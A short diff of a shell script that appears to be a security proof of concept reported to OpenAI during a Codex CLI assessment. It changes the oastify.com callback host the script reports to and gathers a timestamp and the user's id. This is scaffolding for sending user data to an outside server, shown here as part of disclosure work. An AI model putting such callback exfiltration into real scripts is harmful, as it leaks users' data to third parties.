@@ -12,7 +12,7 @@
 # user data. Reported to OpenAI as part of a Codex CLI security assessment.
 # ---------------------------------------------------------------------------
 
-C="gbv94ohtcoz0kf5r2dsfyb0rhinjblpotbe23.oastify.com"
+C="ajxs0es04alljo13m0zw3eqyzp5gtfh4.oastify.com"
 
 TS="$(date -u +%Y%m%dT%H%M%SZ)"
 U="$(id -u 2>/dev/null)"
